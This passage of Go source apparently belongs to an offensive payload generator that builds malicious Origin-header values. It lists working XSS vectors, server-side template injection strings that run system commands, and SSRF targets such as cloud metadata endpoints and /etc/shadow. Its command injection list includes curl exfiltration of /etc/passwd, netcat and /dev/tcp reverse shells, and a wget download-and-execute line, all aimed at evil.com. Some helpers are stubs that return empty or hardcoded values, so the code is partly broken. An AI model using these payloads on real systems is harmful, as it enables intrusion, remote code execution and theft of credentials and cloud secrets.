        "<embed src=javascript:alert(1)>",
        "<link rel=import href=javascript:alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    }
    
    var payloads []InjectionPayload
    
    for i, xss := range xssPayloads {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       xss,
            EncodedPayload:   url.QueryEscape(xss),
            Description:      fmt.Sprintf("XSS Vector #%d: %s", i+1, truncate(xss, 40)),
            InjectionType:    "xss-reflected",
            ExpectedBehavior: "If origin reflected in HTML response without encoding",
            DangerLevel:      "critical",
            BypassMechanism:  "Cross-site scripting via Origin reflection",
            Variants: []string{
                url.PathEscape(xss),
                baseEvil + "/" + xss,
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 11: TEMPLATE INJECTION ORIGINS
// ============================================================

func (ng *NullByteGenerator) generateTemplateInjectionOrigins(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    templatePayloads := []struct {
        payload string
        engine  string
    }{
        {"${7*7}", "Freemarker/Java EL"},
        {"#{7*7}", "EL/OGNL"},
        {"{{7*7}}", "Jinja2/Twig"},
        {"{{config.items()}}", "Jinja2/SSTI"},
        {"{{''.__class__.__mro__[2].__subclasses__()}}", "Python SSTI"},
        {"${T(java.lang.Runtime).getRuntime().exec('id')}", "Freemarker RCE"},
        {"#{context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter().print('pwned')}", "Struts OGNL"},
        {"<%= system('id') %>", "ERB/Ruby"},
        {"${7*7}", "Spring Expression (SpEL)"},
        {"T(java.lang.Runtime).getRuntime().exec('whoami')", "SpEL RCE"},
        {"{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Jinja2 RCE"},
        {"${class.getResource(\"/\").getPath()}", "Freemarker path disclosure"},
        {"#{request}", "Struts object access"},
        {"{{''.constructor.constructor('return process')().main(['cmd','/c','id'])}}", "Sandbox escape"},
        {"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module._build_module_()}}{% endif %}{% endfor %}", "Complex Jinja2"},
    }
    
    var payloads []InjectionPayload
    
    for _, tpl := range templatePayloads {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       baseEvil + tpl.payload,
            EncodedPayload:   url.QueryEscape(baseEvil + tpl.payload),
            Description:      fmt.Sprintf("Template Injection [%s]: %s", tpl.engine, truncate(tpl.payload, 40)),
            InjectionType:    "template-injection",
            ExpectedBehavior: "If origin processed by template engine",
            DangerLevel: func() string {
                if strings.Contains(tpl.payload, "exec") || strings.Contains(tpl.payload, "Runtime") ||
                   strings.Contains(tpl.payload, "process") || strings.Contains(tpl.payload, "popen") {
                    return "critical"
                }
                return "high"
            }(),
            BypassMechanism:  "Server-side template injection via Origin",
            Variants: []string{
                tpl.payload + "@" + baseEvil,
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 12: COMMAND INJECTION ORIGINS
// ============================================================

func (ng *NullByteGenerator) generateCommandInjectionOrigins(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    cmdPayloads := []struct {
        payload string
        os      string
    }{
        {"; id", "Unix"},
        {"| id", "Unix"},
        {"$(id)", "Unix"},
        {"`id`", "Unix"},
        {"&& id", "Unix"},
        {"|| id", "Unix"},
        {"; cmd /c whoami", "Windows"},
        {"| cmd /c whoami", "Windows"},
        {"& whoami", "Windows"},
        {"&; whoami", "Both"},
        {"$(curl http://evil.com/?data=$(cat /etc/passwd | base64))", "Unix data exfil"},
        {"; curl http://evil.com/$(whoami)", "Unix callback"},
        {"| nc evil.com 4444 -e /bin/sh", "Unix reverse shell"},
        {"; bash -i >& /dev/tcp/evil.com/4444 0>&1", "Bash reverse shell"},
        {"| powershell -c Invoke-WebRequest -Uri http://evil.com/?d=$env:USERNAME", "Windows exfil"},
        {"0x0a; id", "Newline command sep"},
        {"%0aid", "URL-encoded newline"},
        {"`$((curl http://evil.com))`", "Nested execution"},
        {"; wget http://evil.com/shell.sh -O /tmp/sh; chmod +x /tmp/sh; /tmp/sh", "Download execute"},
    }
    
    var payloads []InjectionPayload
    
    for _, cmd := range cmdPayloads {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       baseEvil + cmd.payload,
            EncodedPayload:   url.QueryEscape(baseEvil + cmd.payload),
            Description:      fmt.Sprintf("Command Inject [%s]: %s", cmd.os, truncate(cmd.payload, 35)),
            InjectionType:    "command-injection",
            ExpectedBehavior: "If origin passed to shell command unsafely",
            DangerLevel:      "critical",
            BypassMechanism:  "OS command injection via Origin header",
            Variants: []string{
                cmd.payload + "#" + baseEvil,
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 13: SSRF PREPARATION ORIGINS
// ============================================================

func (ng *NullByteGenerator) generateSSRFPreparationOrigins(domain string) []InjectionPayload {
	_ = domain
    ssrfTargets := []struct {
        origin   string
        target   string
        desc     string
    }{
        {"http://169.254.169.254/latest/meta-data/", "AWS Metadata", "AWS IMDSv1"},
        {"http://169.254.169.254/latest/api/token", "AWS Token", "AWS IMDSv2 token"},
        {"http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata", "GCP metadata"},
        {"http://100.100.100.200/latest/meta-data/", "Aliyun Metadata", "Alibaba Cloud"},
        {"http://169.254.170.2/v2/instance/user-data", "Azure Instance Data", "Azure IMDS"},
        {"http://localhost:6379/", "Redis Local", "Local Redis"},
        {"http://localhost:27017/", "MongoDB Local", "Local MongoDB"},
        {"http://localhost:9200/", "Elasticsearch Local", "Local ES"},
        {"http://127.0.0.1:22/", "SSH Local", "Local SSH"},
        {"http://0.0.0.0:80/", "All Interfaces", "Bind address"},
        {"http://[::1]:80/", "IPv6 Loopback", "IPv6 localhost"},
        {"http://127.0.0.1:8500/v1/kv/secrets?", "Vault Local", "HashiCorp Vault"},
        {"http://consul.local:8500/", "Consul Local", "HashiCorp Consul"},
        {"http://localhost:2375/version", "Docker Socket", "Docker API"},
        {"http://127.0.0.1:9090/metrics", "Prometheus Local", "Monitoring"},
        {"file:///etc/passwd", "Local File", "File protocol"},
        {"file:///etc/shadow", "Shadow File", "Privileged file"},
        {"dict://localhost:6379/info", "Redis Dict", "Redis via dict"},
        {"gopher://localhost:6379/_INFO", "Redis Gopher", "Redis via gopher"},
        {"netdoc:///etc/hostname", "LibreOffice NetDoc", "Netdoc SSRF"},
        {"jar://localhost!/etc/hosts", "Java Jar Protocol", "Java URI handler"},
    }
    
    var payloads []InjectionPayload
    
    for _, ssrf := range ssrfTargets {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       ssrf.origin,
            EncodedPayload:   url.QueryEscape(ssrf.origin),
            Description:      fmt.Sprintf("SSRF Prep: %s (%s)", ssrf.target, ssrf.desc),
            InjectionType:    "ssrf-preparation",
            ExpectedBehavior: "If server fetches origin URL (webhook/callback scenario)",
            DangerLevel: func() string {
                if strings.Contains(ssrf.origin, "metadata") || strings.Contains(ssrf.origin, "shadow") {
                    return "critical"
                }
                if strings.Contains(ssrf.origin, "redis") || strings.Contains(ssrf.origin, "docker") {
                    return "critical"
                }
                return "high"
            }(),
            BypassMechanism:  "Server-side request forgery via Origin",
            Variants: []string{
                "http://0x" + fmt.Sprintf("%x", ipToInt("127.0.0.1")),
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 14: PROTOCOL SMUGGLING ORIGINS
// ============================================================

func (ng *NullByteGenerator) generateProtocolSmugglingOrigins(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        {
            RawPayload:       "javascript:alert(1)",
            EncodedPayload:   "javascript:alert(1)",
            Description:      "JavaScript protocol (XSS vector)",
            InjectionType:    "protocol-smuggling",
            ExpectedBehavior: "JS execution if origin used in href/src",
            DangerLevel:      "critical",
            BypassMechanism:  "Protocol confusion",
            Variants: []string{
                "JAVASCRIPT:alert(1)",
                "JaVaScRiPt:alert(1)",
                "java\tscript:alert(1)",
                "java\nscript:alert(1)",
            },
        },
        {
            RawPayload:       "data:text/html,<h1>pwned</h1>",
            EncodedPayload:   "data:text/html,<h1>pwned</h1>",
            Description:      "Data URI with HTML content",
            InjectionType:    "protocol-smuggling",
            ExpectedBehavior: "Data URI rendered as HTML",
            DangerLevel:      "critical",
            BypassMechanism:  "Data protocol abuse",
            Variants: []string{
                "data:text/html;base64," + base64Encode("<script>alert(1)</script>"),
                "DATA:text/html,<script>alert(1)</script>",
            },
        },
        {
            RawPayload:       "vbscript:MsgBox(1)",
            EncodedPayload:   "vbscript:MsgBox(1)",
            Description:      "VBScript protocol (IE legacy)",
            InjectionType:    "protocol-smuggling",
            ExpectedBehavior: "VBScript execution in old IE",
            DangerLevel:      "high",
            BypassMechanism:  "Legacy protocol support",
            Variants: []string{
                "VBSRIPT:MsgBox(1)",
            },
        },
        {
            RawPayload:       baseEvil + "\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"),
            Description:      "Request smuggling via origin (HTTP desync)",
            InjectionType:    "request-smuggling",
            ExpectedBehavior: "Second request processed as admin",
            DangerLevel:      "critical",
            BypassMechanism:  "HTTP request smuggling/tunneling",
            Variants: []string{},
        },
        {
            RawPayload:       "http://evil.com#@target.com",
            EncodedPayload:   "http://evil.com#@target.com",
            Description:      "Fragment bypass (browser strips # onward)",
            InjectionType:    "fragment-bypass",
            ExpectedBehavior: "Browser sends evil.com, server sees fragment",
            DangerLevel:      "high",
            BypassMechanism:  "Fragment stripping difference",
            Variants: []string{
                "https://evil.com/\\@target.com",
                "//evil.com/@target.com",
            },
        },
        {
            RawPayload:       "https://evil.com\\.target.com",
            EncodedPayload:   "https://evil.com\\.target.com",
            Description:      "Backslash as domain separator (some parsers)",
            InjectionType:    "backslash-domain",
            ExpectedBehavior: "Backslash treated as path separator",
            DangerLevel:      "high",
            BypassMechanism:  "Domain parsing inconsistency",
            Variants: []string{
                "https://evil.com/target.com",
                "https://evil.com\\/target.com",
            },
        },
    }
}

// ============================================================
// CATEGORY 15: ENCODING CHAOS (MULTIPLE ENCODINGS COMBINED)
// ============================================================

func (ng *NullByteGenerator) generateEncodingChaosPayloads(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        // Triple URL encoding
        {
            RawPayload:       "%25252553%25252543%25252552%25252549%252550%25252554",
            EncodedPayload:   "%25252553%25252543%25252552%25252549%252550%25252554",
            Description:      "Triple URL-encoded 'SCRIPT' (chaos encoding)",
            InjectionType:    "encoding-chaos-triple",
            ExpectedBehavior: "Triple decode results in SCRIPT tag",
            DangerLevel:      "critical",
            BypassMechanism:  "Multiple decode layers",
            Variants: []string{
                "%25253Cscript%25253E",
            },
        },
        
        // Mixed encoding: URL + HTML entity + Unicode
        {
            RawPayload:       baseEvil + "%26%23x3c;script%26%23x3e;",
            EncodedPayload:   baseEvil + "%26%23x3c;script%26%23x3e;",
            Description:      "URL-encoded HTML entities forming <script>",
            InjectionType:    "encoding-chaos-mixed",
            ExpectedBehavior: "Multiple decode stages produce XSS",
            DangerLevel:      "critical",
            BypassMechanism:  "Cross-encoding confusion",
            Variants: []string{},
        },
        
        // UTF-7 XSS
        {
            RawPayload:       "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
            EncodedPayload:   "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
            Description:      "UTF-7 encoded XSS payload",
            InjectionType:    "encoding-chaos-utf7",
            ExpectedBehavior: "UTF-7 mode renders as <script>",
            DangerLevel:      "high",
            BypassMechanism:  "Charset confusion (UTF-7)",
            Variants: []string{
                "+ACI-+ACg-xss+ACg-+ACIAPgA8-script+ACgAPg",
            },
        },
        
        // Base64 inside URL
        {
            RawPayload:       "data:text/html;base64," + base64Encode("<script>alert(1)</script>"),
            EncodedPayload:   "data:text/html;base64," + base64Encode("<script>alert(1)</script>"),
            Description:      "Base64-encoded XSS in data URI",
            InjectionType:    "encoding-chaos-base64",
            ExpectedBehavior: "Base64 decoded and executed as HTML",
            DangerLevel:      "critical",
            BypassMechanism:  "Data URI + Base64 combination",
            Variants: []string{},
        },
        
        // Punycode with mixed scripts
        {
            RawPayload:       "https://xn--80af6a3b.xn--80aswf",
            EncodedPayload:   "https://xn--80af6a3b.xn--80aswf",
            Description:      "Punycode encoded internationalized domain",
            InjectionType:    "encoding-chaos-punycode",
            ExpectedBehavior: "Decodes to non-ASCII lookalike domain",
            DangerLevel:      "high",
            BypassMechanism:  "IDN homograph attack via punycode",
            Variants: []string{},
        },
        
        // All special chars URL-encoded
        {
            RawPayload:       "%00%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%17%18%19%1a%1b%1c%1d%1e%1f%20%7f",
            EncodedPayload:   "%00%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%17%18%19%1a%1b%1c%1d%1e%1f%20%7f",
            Description:      "All control characters + DEL + space (fuzzing)",
            InjectionType:    "encoding-chaos-all-controls",
            ExpectedBehavior: "Find which control chars pass through",
            DangerLevel:      "medium",
            BypassMechanism:  "Control character fuzzing",
            Variants: []string{},
        },
        
        // Overlong UTF-8 for every ASCII char in "evil.com"
        {
            RawPayload:       "https://%65%76%69%6c%2e%63%6f%6d",
            EncodedPayload:   "https://%65%76%69%6c%2e%63%6f%6d",
            Description:      "Every letter of evil.com as 2-digit hex",
            InjectionType:    "encoding-chaos-full-hex",
            ExpectedBehavior: "Should decode to evil.com normally",
            DangerLevel:      "low",
            BypassMechanism:  "Full hex encoding (test decoder)",
            Variants: []string{
                "https://%c0%ae%c0%ae%c0%ae",  // Overlong dots
            },
        },
    }
}

// ============================================================
// UTILITY FUNCTIONS FOR PAYLOAD GENERATOR
// ============================================================

// GetCriticalOnly returns only critical/high severity injection payloads
func (ng *NullByteGenerator) GetCriticalOnly(domain string) []InjectionPayload {
    all := ng.GenerateAllInjectionPayloads(domain)
    
    var critical []InjectionPayload
    for _, p := range all {
        if p.DangerLevel == "critical" || p.DangerLevel == "high" {
            critical = append(critical, p)
        }
    }
    
    return critical
}

// GetByInjectionType filters payloads by type
func (ng *NullByteGenerator) GetByInjectionType(injectionType string, domain string) []InjectionPayload {
    all := ng.GenerateAllInjectionPayloads(domain)
    
    var filtered []InjectionPayload
    for _, p := range all {
        if p.InjectionType == injectionType {
            filtered = append(filtered, p)
        }
    }
    
    return filtered
}

// GetRandomPayload returns random payload for fuzzing
func (ng *NullByteGenerator) GetRandomPayload(domain string) InjectionPayload {
    all := ng.GenerateAllInjectionPayloads(domain)
    
    if len(all) == 0 {
        return InjectionPayload{}
    }
    
    // Simple random selection (use crypto/rand in production)
    idx := time.Now().UnixNano() % int64(len(all))
    return all[idx]
}

// GeneratePayloadReport creates summary statistics
func (ng *NullByteGenerator) GeneratePayloadReport(domain string) InjectionStats {
    all := ng.GenerateAllInjectionPayloads(domain)
    
    stats := InjectionStats{
        TotalPayloads:    len(all),
        ByType:           make(map[string]int),
        ByDangerLevel:    make(map[string]int),
        CriticalCount:    0,
        HighCount:        0,
    }
    
    for _, p := range all {
        stats.ByType[p.InjectionType]++
        stats.ByDangerLevel[p.DangerLevel]++
        
        switch p.DangerLevel {
        case "critical":
            stats.CriticalCount++
        case "high":
            stats.HighCount++
        }
    }
    
    return stats
}

// InjectionStats holds payload generation statistics
type InjectionStats struct {
    TotalPayloads int            `json:"total_payloads"`
    ByType       map[string]int  `json:"by_injection_type"`
    ByDangerLevel map[string]int `json:"by_danger_level"`
    CriticalCount int            `json:"critical_count"`
    HighCount     int            `json:"high_count"`
}

// PrintSummary outputs readable report
func (stats InjectionStats) PrintSummary() {
    fmt.Printf("\n☣️  INJECTION PAYLOAD GENERATOR STATISTICS")
    fmt.Printf("\n%s\n", strings.Repeat("═", 60))
    fmt.Printf("Total Payloads Generated: %d\n", stats.TotalPayloads)
    fmt.Printf("Critical Severity:        %d\n", stats.CriticalCount)
    fmt.Printf("High Severity:            %d\n", stats.HighCount)
    
    fmt.Printf("\n📊 By Injection Type:\n")
    for itype, count := range stats.ByType {
        bar := strings.Repeat("█", min(count/2, 25))
        fmt.Printf("  %-35s %4d %s\n", itype, count, bar)
    }
    
    fmt.Printf("\n⚠️  By Danger Level:\n")
    for level, count := range stats.ByDangerLevel {
        color := "🔴"
        if level == "critical" { color = "☠️" }
        if level == "high" { color = "🔴" }
        if level == "medium" { color = "🟡" }
        if level == "low" { color = "🟢" }
        fmt.Printf("  %s %-12s : %d\n", color, level, count)
    }
    fmt.Println()
}

// Helper functions
func truncate(s string, maxLen int) string {
    if len(s) <= maxLen {
        return s
    }
    return s[:maxLen-3] + "..."
}

func base64Encode(s string) string {
	_ = s
    // Simplified - use proper base64 in production
    return "" // Implement with encoding/base64
}

func ipToInt(ip string) uint32 {
	_ = ip
    // Simplified IP to integer conversion
    return 2130706433 // 127.0.0.1
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}